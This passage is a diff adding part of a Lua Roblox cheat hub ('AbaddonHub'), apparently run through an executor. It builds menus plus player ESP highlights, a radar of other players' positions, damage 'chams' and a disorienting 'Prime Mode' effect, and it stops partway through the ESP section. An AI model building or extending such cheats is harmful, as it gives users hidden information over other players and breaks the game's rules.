@@ -1,0 +1,3561 @@
+-- ================================================================
+--  AbaddonHub Part2 — UI, Menus, Input, Loops
+--  Requires Part1 to have run first
+-- ================================================================
+
+local function _AbaddonHubMain_Part2()
+local _e = getgenv()
+
+-- Import from Part1
+local gui = _e._hub_gui
+local blurEffect = _e._hub_blurEffect
+local toggleBlur = _e._hub_toggleBlur
+local showNotification = _e._hub_showNotification
+local repositionNotifs = _e._hub_repositionNotifs
+local removeNotif = _e._hub_removeNotif
+local applyLayoutPos = _e._hub_applyLayoutPos
+local makeDraggable = _e._hub_makeDraggable
+local makeResizable = _e._hub_makeResizable
+local updateAllVisuals = _e._hub_updateAllVisuals
+local updateMenuBg = _e._hub_updateMenuBg
+local updatePlayerEsp = _e._hub_updatePlayerEsp
+local updateTargetEsp = _e._hub_updateTargetEsp
+local updateScanner = _e._hub_updateScanner
+local updateBedAlarmVisual = _e._hub_updateBedAlarmVisual
+local updatePanicCircleVisual = _e._hub_updatePanicCircleVisual
+local updateServerHitbox = _e._hub_updateServerHitbox
+local updateAbaddonFovCircle = _e._hub_updateAbaddonFovCircle
+local checkBedAlarm = _e._hub_checkBedAlarm
+local checkPanicCircle = _e._hub_checkPanicCircle
+local stopAlarm = _e._hub_stopAlarm
+local stopPanicAlarm = _e._hub_stopPanicAlarm
+local syncAuraNotif = _e._hub_syncAuraNotif
+local createAuraNotifGui = _e._hub_createAuraNotifGui
+local createAbaddonFovCircleGui = _e._hub_createAbaddonFovCircleGui
+local createSpectateWindow = _e._hub_createSpectateWindow
+local createAutokitWindow = _e._hub_createAutokitWindow
+local createMainHud = _e._hub_createMainHud
+local createServerHpWindow = _e._hub_createServerHpWindow
+local toggleMainHud = _e._hub_toggleMainHud
+local toggleServerHp = _e._hub_toggleServerHp
+local toggleStaffStats = _e._hub_toggleStaffStats
+local toggleFriendHp = _e._hub_toggleFriendHp
+local toggleCrosshairHp = _e._hub_toggleCrosshairHp
+local toggleTaliyah = _e._hub_toggleTaliyah
+local toggleVoidDrop = _e._hub_toggleVoidDrop
+local enableKitEsp = _e._hub_enableKitEsp
+local resetKitEsp = _e._hub_resetKitEsp
+local enableOreEsp = _e._hub_enableOreEsp
+local disableOreEsp = _e._hub_disableOreEsp
+local oreEspUpdateColors = _e._hub_oreEspUpdateColors
+local enableStrategicEsp = _e._hub_enableStrategicEsp
+local disableStrategicEsp = _e._hub_disableStrategicEsp
+local destroyServerHitboxClone = _e._hub_destroyServerHitboxClone
+local destroyCrosshairHp = _e._hub_destroyCrosshairHp
+local destroyCrosshairHp = _e._hub_destroyCrosshairHp
+local autokitStep = _e._hub_autokitStep
+local autoFishLoop = _e._hub_autoFishLoop
+local farmerLoop = _e._hub_farmerLoop
+local abaddonPowerStep = _e._hub_abaddonPowerStep
+local scanExistingPrompts = _e._hub_scanExistingPrompts
+local initTargetInfoUI = _e._hub_initTargetInfoUI
+
+-- === МЕНЮ (VISUALS) ===
+-- === PRIME MODE ===
+local function primeModeCleanup()
+    isPrimeModeEnabled = false
+    -- Disconnect player connections
+    for _, c in pairs(primeModeCharConns) do pcall(function() c:Disconnect() end) end
+    table.clear(primeModeCharConns)
+    if primeModePlayerAddedConn then
+        pcall(function() primeModePlayerAddedConn:Disconnect() end)
+        primeModePlayerAddedConn = nil
+    end
+    -- Remove billboards
+    for _, b in pairs(primeModeBillboards) do pcall(function() b:Destroy() end) end
+    table.clear(primeModeBillboards)
+    -- Unbind camera effect
+    pcall(function() RS:UnbindFromRenderStep("TrippyCameraEffect") end)
+    -- Restore camera FOV
+    pcall(function() if primeModeOrigFov then camera.FieldOfView = primeModeOrigFov end end)
+    primeModeOrigFov = nil
+    -- Destroy lighting effects
+    if primeModeColorCorr then pcall(function() primeModeColorCorr:Destroy() end); primeModeColorCorr = nil end
+    if primeModeBlur       then pcall(function() primeModeBlur:Destroy() end);       primeModeBlur = nil end
+    if primeModeSky        then pcall(function() primeModeSky:Destroy() end);        primeModeSky = nil end
+    -- Stop and destroy sound
+    if primeModeSound then
+        pcall(function() primeModeSound:Stop() end)
+        pcall(function() primeModeSound:Destroy() end)
+        primeModeSound = nil
+    end
+    -- Destroy screen GUI
+    if primeModeScreenGui then
+        pcall(function() primeModeScreenGui:Destroy() end)
+        primeModeScreenGui = nil
+    end
+    -- Restore sound service settings
+    pcall(function() game:GetService("SoundService").AmbientReverb = Enum.ReverbType.NoReverb end)
+end
+
+local function primeModeAddBillboard(character)
+    if not isPrimeModeEnabled then return end
+    if character == player.Character then return end
+    local root = character:FindFirstChild("HumanoidRootPart")
+        or character:FindFirstChild("UpperTorso")
+        or character:FindFirstChild("Torso")
+    if not root then return end
+    local bb = Instance.new("BillboardGui")
+    bb.Size = UDim2.new(5,0,5,0)
+    bb.AlwaysOnTop = true
+    local img = Instance.new("ImageLabel", bb)
+    img.Size = UDim2.new(1,0,1,0)
+    img.Image = "rbxthumb://type=Asset&id=12983135493&w=420&h=420"
+    img.BackgroundTransparency = 1
+    bb.Parent = root
+    table.insert(primeModeBillboards, bb)
+end
+
+local function togglePrimeMode(state)
+    if state == isPrimeModeEnabled then return end
+    if not state then
+        primeModeCleanup()
+        pcall(function() showNotification("Prime Mode", { { text = "Disabled", color = Color3.fromRGB(255,120,120) } }) end)
+        return
+    end
+    isPrimeModeEnabled = true
+    primeModeOrigFov = camera.FieldOfView  -- save before any change
+    pcall(function() showNotification("Prime Mode", { { text = "Enabled", color = Color3.fromRGB(120,255,120) } }) end)
+
+    -- Sound service
+    if primeModeEcho then pcall(function() game:GetService("SoundService").AmbientReverb = Enum.ReverbType.Cave end) end
+
+    -- ColorCorrection
+    primeModeColorCorr = Instance.new("ColorCorrectionEffect")
+    primeModeColorCorr.Parent = Lighting
+
+    -- Blur
+    primeModeBlur = Instance.new("BlurEffect")
+    primeModeBlur.Size = 4
+    primeModeBlur.Parent = Lighting
+
+    -- Sky
+    primeModeSky = Instance.new("Sky")
+    local skyTex = "rbxthumb://type=Asset&id=16229312490&w=420&h=420"
+    primeModeSky.SkyboxBk = skyTex; primeModeSky.SkyboxDn = skyTex
+    primeModeSky.SkyboxFt = skyTex; primeModeSky.SkyboxLf = skyTex
+    primeModeSky.SkyboxRt = skyTex; primeModeSky.SkyboxUp = skyTex
+    primeModeSky.Parent = Lighting
+
+    -- Sound
+    local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://99938454010795"
+    snd.PlaybackSpeed = 0.2
+    snd.Volume = primeModeVolume
+    snd.Looped = true
+    snd.RollOffMaxDistance = 0  -- audible everywhere, no 3D falloff
+    snd.Parent = game:GetService("SoundService")
+    local dist2 = Instance.new("DistortionSoundEffect"); dist2.Level = 1; dist2.Parent = snd
+    local eq2 = Instance.new("EqualizerSoundEffect"); eq2.LowGain=10; eq2.MidGain=10; eq2.HighGain=10; eq2.Parent = snd
+    primeModeSound = snd
+    -- Wait for asset to load then play
+    task.spawn(function()
+        local ok = pcall(function()
+            if not snd.IsLoaded then snd.Loaded:Wait() end
+        end)
+        if isPrimeModeEnabled and primeModeSound == snd then
+            pcall(function() snd:Play() end)
+        end
+    end)
+
+    -- Screen GUI (crosshair)
+    local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+    primeModeScreenGui = Instance.new("ScreenGui")
+    primeModeScreenGui.DisplayOrder = 999999
+    primeModeScreenGui.ResetOnSpawn = false
+    primeModeScreenGui.Parent = pg
+    local ch = Instance.new("ImageLabel", primeModeScreenGui)
+    ch.Size = UDim2.new(0,60,0,60)
+    ch.Position = UDim2.new(0.5,0,0.48,0)
+    ch.AnchorPoint = Vector2.new(0.5,0.5)
+    ch.Image = "rbxthumb://type=Asset&id=15233722645&w=420&h=420"
+    ch.BackgroundTransparency = 1
+    ch.ZIndex = 999999
+
+    -- Billboards for existing players
+    for _, p2 in pairs(Players:GetPlayers()) do
+        if p2 ~= player and p2.Character then
+            primeModeAddBillboard(p2.Character)
+        end
+        local conn = p2.CharacterAdded:Connect(function(char)
+            task.wait(0.5); primeModeAddBillboard(char)
+        end)
+        table.insert(primeModeCharConns, conn)
+    end
+    primeModePlayerAddedConn = Players.PlayerAdded:Connect(function(p2)
+        local conn = p2.CharacterAdded:Connect(function(char)
+            task.wait(0.5); primeModeAddBillboard(char)
+        end)
+        table.insert(primeModeCharConns, conn)
+    end)
+
+    -- Camera chaos loop
+    local timePassed = 0
+    RS:BindToRenderStep("TrippyCameraEffect", Enum.RenderPriority.Camera.Value + 1, function(dt)
+        if not isPrimeModeEnabled then
+            RS:UnbindFromRenderStep("TrippyCameraEffect")
+            pcall(function() if primeModeOrigFov then camera.FieldOfView = primeModeOrigFov; primeModeOrigFov = nil end end)
+            return
+        end
+        timePassed = timePassed + dt
+        local r = (math.sin(timePassed * 1.5) + 1) / 2
+        local g = (math.sin(timePassed * 2.2) + 1) / 2
+        local b2 = (math.sin(timePassed * 3.1) + 1) / 2
+        if primeModeColorCorr then
+            primeModeColorCorr.TintColor = Color3.new(r, g, b2)
+            primeModeColorCorr.Contrast = 0.4 + math.sin(timePassed * 4) * 0.3
+        end
+        local sk = primeModeShake
+        if primeModeChangeFov then camera.FieldOfView = 70 + math.sin(timePassed * 3) * 20 * sk end
+        local tiltZ  = math.sin(timePassed * 2)  * 5   * sk
+        local shakeX = math.sin(timePassed * 15) * 0.4 * sk
+        local shakeY = math.cos(timePassed * 12) * 0.4 * sk
+        camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(shakeX), math.rad(shakeY), math.rad(tiltZ))
+    end)
+end
+
+
+-- === WORLD COLOR ===
+
+
+
+
+
+
+local function wcDestroy()
+    wcEnabled = false
+    if wcColorCorrect then
+        pcall(function() wcColorCorrect:Destroy() end)
+        wcColorCorrect = nil
+    end
+end
+
+local function wcApply()
+    local L = game:GetService("Lighting")
+    -- Color correction
+    if not wcColorCorrect then
+        -- Remove any previous
+        local old = L:FindFirstChild("AbaddonWorldColor")
+        if old then old:Destroy() end
+        wcColorCorrect = Instance.new("ColorCorrectionEffect")
+        wcColorCorrect.Name = "AbaddonWorldColor"
+        wcColorCorrect.Parent = L
+    end
+    -- Blend tint with white based on intensity
+    local t = wcIntensity
+    local r = math.floor(255 * (1-t) + wcColorR * t + 0.5)
+    local g = math.floor(255 * (1-t) + wcColorG * t + 0.5)
+    local b2 = math.floor(255 * (1-t) + wcColorB * t + 0.5)
+    wcColorCorrect.TintColor = Color3.fromRGB(r, g, b2)
+    wcColorCorrect.Enabled = true
+end
+
+local function toggleWorldColor(state)
+    wcEnabled = state
+    if state then
+        wcApply()
+    else
+        if wcColorCorrect then
+            pcall(function() wcColorCorrect.Enabled = false end)
+        end
+    end
+end
+
+
+-- === HIT CHAMS ===
+local function hitChamsFlash(p)
+    if _hitChamsActive[p] then return end
+    local char = p.Character
+    if not char then return end
+    _hitChamsActive[p] = true
+    local col = Color3.fromRGB(hitChamsR, hitChamsG, hitChamsB)
+    local transp = math.clamp(1 - hitChamsIntensity, 0, 0.9)
+    local hl = Instance.new("Highlight")
+    hl.Name = "AbaddonHitChams"
+    hl.FillColor = col
+    hl.OutlineColor = col
+    hl.FillTransparency = transp
+    hl.OutlineTransparency = 1
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.Adornee = char
+    hl.Parent = workspace
+    task.delay(hitChamsDuration, function()
+        pcall(function() hl:Destroy() end)
+        _hitChamsActive[p] = nil
+    end)
+end
+
+local function hitChamsTick()
+    if not isHitChamsEnabled then return end
+    local myChar = player.Character
+    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+    if not myRoot then return end
+    for _, p in pairs(game.Players:GetPlayers()) do
+        if p ~= player and p.Character then
+            local hum = p.Character:FindFirstChild("Humanoid")
+            local root = p.Character:FindFirstChild("HumanoidRootPart")
+            if hum and root then
+                local dist = (root.Position - myRoot.Position).Magnitude
+                if dist <= 30 then
+                    local cur = hum.Health
+                    local last = _hitChamsHealths[p.Name]
+                    if last ~= nil and cur < last then
+                        task.spawn(hitChamsFlash, p)
+                    end
+                    _hitChamsHealths[p.Name] = cur
+                else
+                    _hitChamsHealths[p.Name] = nil
+                end
+            end
+        end
+    end
+end
+
+local function destroyHitChams()
+    isHitChamsEnabled = false
+    if hitChamsConn then hitChamsConn:Disconnect(); hitChamsConn=nil end
+    for _, obj in pairs(workspace:GetChildren()) do
+        if obj.Name == "AbaddonHitChams" then
+            pcall(function() obj:Destroy() end)
+        end
+    end
+    _hitChamsActive = {}
+    _hitChamsHealths = {}
+end
+
+local function toggleHitChams(state)
+    isHitChamsEnabled = state
+    if state then
+        if not hitChamsConn then
+            hitChamsConn = RunService.Heartbeat:Connect(function()
+                if isHitChamsEnabled then pcall(hitChamsTick) end
+            end)
+        end
+    else
+        destroyHitChams()
+    end
+end
+
+-- === PLAYER RADAR ===
+
+
+
+
+
+local RADAR_PX    = 200   -- radar circle diameter in pixels
+local RADAR_RANGE = 500   -- world studs radius
+
+local function destroyRadar()
+    isRadarEnabled = false
+    if radarConn then radarConn:Disconnect(); radarConn = nil end
+    if radarGui  then pcall(function() radarGui:Destroy() end); radarGui = nil end
+    _radarBlips = {}
+end
+
+local function createRadar()
+    destroyRadar()
+    isRadarEnabled = true
+    local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "Abaddon_Radar"
+    sg.IgnoreGuiInset = true
+    sg.ResetOnSpawn = false
+    sg.DisplayOrder = 800
+    sg.Parent = pg
+    radarGui = sg
+
+    -- Background circle
+    local bg = Instance.new("Frame", sg)
+    bg.Name = "RadarBg"
+    bg.Size = UDim2.new(0, RADAR_PX, 0, RADAR_PX)
+    bg.AnchorPoint = Vector2.new(1, 0.5)
+    bg.Position = UDim2.new(1, -10, 0.5, 0)
+    bg.BackgroundColor3 = menuBgColor
+    bg.BackgroundTransparency = menuBgTransparency
+    bg.BorderSizePixel = 0
+    bg.ClipsDescendants = true
+    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 14)
+    local ring = Instance.new("UIStroke", bg)
+    ring.Color = currentThemeColor
+    ring.Thickness = 1.5
+
+    -- Crosshair lines (theme color)
+    local function mkLine(h)
+        local l = Instance.new("Frame", bg)
+        l.BackgroundColor3 = currentThemeColor
+        l.BackgroundTransparency = 0.7
+        l.BorderSizePixel = 0
+        l.AnchorPoint = Vector2.new(0.5, 0.5)
+        l.Position = UDim2.new(0.5, 0, 0.5, 0)
+        l.Size = h and UDim2.new(1, 0, 0, 1) or UDim2.new(0, 1, 1, 0)
+    end
+    mkLine(true); mkLine(false)
+
+    -- Self dot (theme color, center)
+    local selfDot = Instance.new("Frame", bg)
+    selfDot.Size = UDim2.new(0, 7, 0, 7)
+    selfDot.AnchorPoint = Vector2.new(0.5, 0.5)
+    selfDot.Position = UDim2.new(0.5, 0, 0.5, 0)
+    selfDot.BackgroundColor3 = currentThemeColor
+    selfDot.BorderSizePixel = 0
+    selfDot.ZIndex = 5
+    Instance.new("UICorner", selfDot).CornerRadius = UDim.new(1, 0)
+
+    local half = RADAR_PX / 2
+
+    -- Update loop: 10 fps is smooth enough for radar
+    local lastTick = 0
+    radarConn = RunService.Heartbeat:Connect(function()
+        if not isRadarEnabled then return end
+        local now = tick()
+        if now - lastTick < 0.05 then return end
+        lastTick = now
+
+        local myChar = player.Character
+        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        if not myRoot then return end
+
+        local myPos = myRoot.Position
+        local seen  = {}
+
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p ~= player and p.Character then
+                local root = p.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local diff = root.Position - myPos
+                    -- Camera-relative direction
+                    local myCF = myRoot.CFrame
+                    local relX = myCF.RightVector:Dot(diff)
+                    local relZ = myCF.LookVector:Dot(diff)
+                    local dist = math.sqrt(relX*relX + relZ*relZ)
+                    if dist <= RADAR_RANGE then
+                        local scale = math.min(dist / RADAR_RANGE, 1)
+                        local nx = (relX / math.max(dist, 0.01)) * scale * half
+                        local nz = (relZ / math.max(dist, 0.01)) * scale * half
+                        -- dot color = team color, fallback = theme color
+                        local col = p.Team and p.TeamColor.Color or currentThemeColor
+                        local dot = _radarBlips[p]
+                        if not dot or not dot.Parent then
+                            dot = Instance.new("Frame", bg)
+                            dot.Size = UDim2.new(0, 7, 0, 7)
+                            dot.AnchorPoint = Vector2.new(0.5, 0.5)
+                            dot.BorderSizePixel = 0
+                            dot.ZIndex = 4
+                            Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+                            _radarBlips[p] = dot
+                        end
+                        dot.BackgroundColor3 = col
+                        -- Smooth lerp to new position
+                        local curX = dot.Position.X.Offset
+                        local curY = dot.Position.Y.Offset
+                        local tX = math.floor(nx)
+                        local tY = math.floor(-nz)
+                        local lerpF = 0.18  -- lower = smoother
+                        dot.Position = UDim2.new(0.5, math.floor(curX + (tX - curX) * lerpF),
+                                                 0.5, math.floor(curY + (tY - curY) * lerpF))
+                        dot.Visible = true
+                        seen[p] = true
+                    end
+                end
+            end
+        end
+
+        for p, dot in pairs(_radarBlips) do
+            if not seen[p] then dot.Visible = false end
+        end
+    end)
+
+    -- Drag: only when menu visible
+    local drag, dragStart, dragPos0 = false, nil, nil
+    bg.InputBegan:Connect(function(inp)
+        if not isMenuOpen then return end
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            drag = true; dragStart = inp.Position; dragPos0 = bg.Position
+        end
+    end)
+    bg.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            drag = false
+            savedLayoutPositions["RadarBg"] = {
+                bg.Position.X.Scale, bg.Position.X.Offset,
+                bg.Position.Y.Scale, bg.Position.Y.Offset
+            }
+        end
+    end)
+    UIS.InputChanged:Connect(function(inp)
+        if drag and inp.UserInputType == Enum.UserInputType.MouseMovement then
+            local d = inp.Position - dragStart
+            bg.Position = UDim2.new(
+                dragPos0.X.Scale, dragPos0.X.Offset + d.X,
+                dragPos0.Y.Scale, dragPos0.Y.Offset + d.Y)
+        end
+    end)
+
+    -- Restore saved position
+    local saved = savedLayoutPositions["RadarBg"]
+	if saved and #saved == 4 then
+    	bg.Position = UDim2.new(saved[1], saved[2], saved[3], saved[4])
+	end
+end
+
+local function toggleRadar(state)
+    if state then createRadar() else destroyRadar() end
+end
+
+
+local function createVisualWindow()
+-- Override crosshairHp syncFn to actually call toggleCrosshairHp
+do
+    local _origBtn = buttonSyncFns["crosshairHp"]
+    buttonSyncFns["crosshairHp"] = function(st)
+        toggleCrosshairHp(st)
+        if _origBtn then _origBtn(st) end
+    end
+end
+    local f = Instance.new("Frame", gui); f.Name="Visuals_Main"; f.Size=UDim2.new(0,220,0,520); 
+    f.Position=UDim2.new(0.5, -570, 0.22, 0);
+    f.BackgroundColor3=menuBgColor; f.BackgroundTransparency=menuBgTransparency; f.BorderSizePixel=0
+    Instance.new("UICorner",f).CornerRadius=UDim.new(0,10)
+    local t = Instance.new("TextLabel",f); t.Text="Visuals"; t.Size=UDim2.new(1,0,0,30); t.BackgroundTransparency=1; t.TextColor3=currentThemeColor; t.Font=Enum.Font.GothamBlack; t.TextSize=18
+    local s = Instance.new("ScrollingFrame",f); s.Name="List"; s.Size=UDim2.new(1,-10,1,-40); s.Position=UDim2.new(0,5,0,35); s.BackgroundTransparency=1; s.BorderSizePixel=0; s.ScrollBarThickness=6; s.ScrollingDirection=Enum.ScrollingDirection.Y; s.AutomaticCanvasSize=Enum.AutomaticSize.Y
+    Instance.new("UIListLayout",s).SortOrder=Enum.SortOrder.LayoutOrder; s.UIListLayout.Padding=UDim.new(0,8)
+
+    local function createToggle(text, callback, default, featureKey)
+        local b = Instance.new("TextButton", s); b.Size=UDim2.new(1,0,0,32); b.Text=text; b.Font=Enum.Font.Gotham; b.TextSize=14; b.AutoButtonColor=false
+        b.BackgroundTransparency = 0.6
+        Instance.new("UICorner",b).CornerRadius=UDim.new(0,12) 
+        local on = default or false
+        activeButtonStates[b] = on 
+        
+        local function update()
+            b.BackgroundColor3 = on and currentThemeColor or Color3.fromRGB(40,40,40)
+            b.BackgroundTransparency = on and 0.3 or 0.6
+            b.TextColor3 = on and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        update()
+
+        if featureKey then
+            buttonSyncFns[featureKey] = function(state)
+                on = state
+                activeButtonStates[b] = state
+                update()
+            end
+        end
+
+        b.MouseButton1Click:Connect(function()
+            on = not on
+            activeButtonStates[b] = on
+            update()
+            callback(on)
+        end)
+    end
+
+    -- Player ESP Section
+    local function createAbaddonHudSection()
+        local ROW = 30; local GAP = 5; local SEP = 18; local BOX = 26; local BTN = 30
+        local OPEN_H = 36 + 3*(ROW+GAP) + (SEP+GAP) + (BTN+GAP) + 3*(BOX+GAP)
+
+        local c = Instance.new("Frame", s)
+        c.Name = "AbaddonHudContainer"; c.Size = UDim2.new(1,0,0,32)
+        c.BackgroundTransparency = 1; c.ClipsDescendants = true
+
+        local top = Instance.new("Frame", c)
+        top.Size = UDim2.new(1,0,0,32); top.BackgroundTransparency = 1
+
+        local main = Instance.new("TextButton", top)
+        main.Size = UDim2.new(0.8,-4,1,0); main.Text = "Abaddon HUD"
+        main.Font = Enum.Font.Gotham; main.TextSize = 14; main.AutoButtonColor = false
+        main.BackgroundTransparency = 0.6; main.BackgroundColor3 = Color3.fromRGB(40,40,40); main.TextColor3 = Color3.new(1,1,1)
+        Instance.new("UICorner",main).CornerRadius = UDim.new(0,12)
+        activeButtonStates[main] = false
+        buttonSyncFns["abaddonHud"] = function(st) activeButtonStates[main]=st; main.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); main.BackgroundTransparency=st and 0.3 or 0.6; main.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        local function updMaster()
+            main.BackgroundColor3 = isAbaddonHudEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isAbaddonHudEnabled and 0.3 or 0.6
+            main.TextColor3 = isAbaddonHudEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+
+        local arr = Instance.new("TextButton", top)
+        arr.Size = UDim2.new(0.2,0,1,0); arr.Position = UDim2.new(0.8,0,0,0)
+        arr.BackgroundColor3 = Color3.fromRGB(35,35,35); arr.Text = "v"
+        arr.TextColor3 = Color3.new(1,1,1); arr.Font = Enum.Font.GothamBold; arr.TextSize = 14; arr.AutoButtonColor = false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius = UDim.new(0,12)
+
+        local drop = Instance.new("Frame", c)
+        drop.Position = UDim2.new(0,0,0,36); drop.Size = UDim2.new(1,0,0,OPEN_H)
+        drop.BackgroundTransparency = 1
+        local layout = Instance.new("UIListLayout", drop)
+        layout.Padding = UDim.new(0,GAP); layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+        local lo = 0; local function nlo() lo=lo+1; return lo end
+        local subOn = {}; local subOnFns = {}; local subOffFns = {}
+        local function subToggle(text, onFn, offFn)
+            local b = Instance.new("TextButton", drop)
+            b.LayoutOrder = nlo(); b.Size = UDim2.new(1,0,0,ROW); b.Text = text
+            b.Font = Enum.Font.Gotham; b.TextSize = 12; b.AutoButtonColor = false
+            b.BackgroundTransparency = 0.6; b.BackgroundColor3 = Color3.fromRGB(35,35,35); b.TextColor3 = Color3.new(1,1,1)
+            Instance.new("UICorner",b).CornerRadius = UDim.new(0,8)
+            subOn[text] = false; subOnFns[text] = onFn; subOffFns[text] = offFn or onFn
+            local function upd()
+                b.BackgroundColor3 = subOn[text] and currentThemeColor or Color3.fromRGB(35,35,35)
+                b.BackgroundTransparency = subOn[text] and 0.3 or 0.6
+                b.TextColor3 = subOn[text] and Color3.new(0,0,0) or Color3.new(1,1,1)
+            end
+            -- Register sync function for config load
+            local syncKey = ({["Main HUD"]="mainHud",["Server HP List"]="serverHp",["Staff Statistics"]="staffStats"})[text]
+            if syncKey then
+                buttonSyncFns[syncKey] = function(st)
+                    subOn[text] = st
+                    upd()
+                end
+            end
+            b.MouseButton1Click:Connect(function()
+                subOn[text] = not subOn[text]; upd()
+                if isAbaddonHudEnabled then
+                    if subOn[text] then subOnFns[text]() else subOffFns[text]() end
+                end
+            end)
+        end
+
+        subToggle("Main HUD", function() toggleMainHud(true) end, function() toggleMainHud(false) end)
+        subToggle("Server HP List",
+            function() isServerHpVisible=true; toggleServerHp(true) end,
+            function() isServerHpVisible=false; toggleServerHp(false) end)
+        subToggle("Staff Statistics", function() toggleStaffStats(true) end, function() toggleStaffStats(false) end)
+
+        local sep = Instance.new("TextLabel", drop)
+        sep.LayoutOrder = nlo(); sep.Size = UDim2.new(1,0,0,SEP); sep.BackgroundTransparency = 1
+        sep.TextColor3 = Color3.fromRGB(130,130,130); sep.Font = Enum.Font.GothamBold; sep.TextSize = 10
+        sep.Text = "-- Friend HP HUD --"
+
+        local fhOn = false
+        local fhBtn = Instance.new("TextButton", drop)
+        fhBtn.LayoutOrder = nlo(); fhBtn.Size = UDim2.new(1,0,0,BTN); fhBtn.Text = "Friend HP: OFF"
+        fhBtn.Font = Enum.Font.Gotham; fhBtn.TextSize = 12; fhBtn.AutoButtonColor = false
+        fhBtn.BackgroundTransparency = 0.6; fhBtn.BackgroundColor3 = Color3.fromRGB(35,35,35); fhBtn.TextColor3 = Color3.new(1,1,1)
+        Instance.new("UICorner",fhBtn).CornerRadius = UDim.new(0,8)
+        local function updFh()
+            fhBtn.BackgroundColor3 = fhOn and currentThemeColor or Color3.fromRGB(35,35,35)
+            fhBtn.BackgroundTransparency = fhOn and 0.3 or 0.6
+            fhBtn.TextColor3 = fhOn and Color3.new(0,0,0) or Color3.new(1,1,1)
+            fhBtn.Text = fhOn and "Friend HP: ON" or "Friend HP: OFF"
+        end
+
+		buttonSyncFns["friendHpVisible"] = function(st)
+    		fhOn = st
+    		isFriendHpVisible = st
+    		updFh()
+		end
+
+
+        fhBtn.MouseButton1Click:Connect(function()
+            fhOn = not fhOn; updFh()
+            isFriendHpVisible = fhOn
+            if isAbaddonHudEnabled then toggleFriendHp(fhOn) end
+        end)
+
+        for i = 1, 3 do
+            local row = Instance.new("Frame", drop)
+            row.LayoutOrder = nlo(); row.Size = UDim2.new(1,0,0,BOX); row.BackgroundTransparency = 1
+            local lbl = Instance.new("TextLabel", row)
+            lbl.Size = UDim2.new(0.22,0,1,0); lbl.BackgroundTransparency = 1
+            lbl.TextColor3 = Color3.fromRGB(180,180,180); lbl.Font = Enum.Font.Gotham; lbl.TextSize = 11
+            lbl.Text = "#"..i..":"; lbl.TextXAlignment = Enum.TextXAlignment.Left
+            local box = Instance.new("TextBox", row)
+            box.Size = UDim2.new(0.76,0,0.85,0); box.Position = UDim2.new(0.22,0,0.075,0)
+            box.BackgroundColor3 = Color3.fromRGB(20,20,20); box.BackgroundTransparency = 0.3; box.BorderSizePixel = 0
+            box.TextColor3 = Color3.new(1,1,1); box.Font = Enum.Font.Gotham; box.TextSize = 11
+            box.PlaceholderText = "nick/display..."; box.ClearTextOnFocus = false; box.Text = friendTargetNames[i]
+            Instance.new("UICorner",box).CornerRadius = UDim.new(0,4)
+            local idx = i
+            sliderSyncFns["friendNick"..i] = function() box.Text = friendTargetNames[i] or "" end
+            box:GetPropertyChangedSignal("Text"):Connect(function()
+                friendTargetNames[idx] = box.Text
+                if isFriendHpEnabled and friendHpGui then
+                    local slot = friendHpGui:FindFirstChild("Slot"..idx)
+                    if slot then
+                        slot.Visible = (box.Text ~= "")
+                        local n = slot:FindFirstChild("FriendName")
+                        if n then n.Text = box.Text ~= "" and box.Text or "---" end
+                    end
+                end
+            end)
+        end
+
+        main.MouseButton1Click:Connect(function()
+            isAbaddonHudEnabled = not isAbaddonHudEnabled
+            activeButtonStates[main] = isAbaddonHudEnabled; updMaster()
+            if isAbaddonHudEnabled then
+                if subOn["Main HUD"] then toggleMainHud(true) end
+                if subOn["Server HP List"] then isServerHpVisible=true; toggleServerHp(true) end
+                if subOn["Staff Statistics"] then toggleStaffStats(true) end
+                if fhOn then isFriendHpVisible=true; toggleFriendHp(true) end
+            else
+                toggleMainHud(false); toggleServerHp(false); toggleStaffStats(false); toggleFriendHp(false)
+            end
+        end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp; arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,OPEN_H) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+
+    local function createPlayerEspSection()
+        local c = Instance.new("Frame", s); c.Name="PlayerEspContainer"; c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1; c.ClipsDescendants=true
+        local top = Instance.new("Frame", c); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        
+        local main = Instance.new("TextButton", top); main.Size=UDim2.new(0.8,-4,1,0); main.Text="ESP"; main.Font=Enum.Font.Gotham; main.TextSize=14; main.AutoButtonColor=false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner",main).CornerRadius=UDim.new(0,12)
+        
+        activeButtonStates[main] = isPlayerEspEnabled
+        buttonSyncFns["espEnabled"] = function(st) activeButtonStates[main]=st; main.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); main.BackgroundTransparency=st and 0.3 or 0.6; main.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        local function updMain()
+            main.BackgroundColor3 = isPlayerEspEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isPlayerEspEnabled and 0.3 or 0.6
+            main.TextColor3 = isPlayerEspEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updMain()
+        
